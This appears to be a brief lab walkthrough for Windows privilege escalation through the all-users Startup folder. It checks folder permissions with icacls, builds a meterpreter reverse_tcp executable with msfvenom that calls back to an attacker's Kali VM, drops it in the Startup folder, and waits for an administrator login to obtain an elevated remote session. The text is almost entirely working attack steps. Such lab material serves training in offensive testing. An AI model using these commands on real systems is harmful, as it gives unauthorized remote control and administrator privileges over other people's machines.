# Start Up Applications

Open command prompt and type:

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

If We have&#x20;

F means Full Access

M modify Access

RX read and executable

Create an script using msfvenom

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe`

Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.\
2\. Logoff.\
3\. Login with the administrator account credentials.

Kali VM

1\. Wait for a session to be created, it may take a few seconds.\
2\. In Meterpreter(meterpreter > prompt) type: getuid\
3\. From the output, notice the user is “User-PC\Admin”
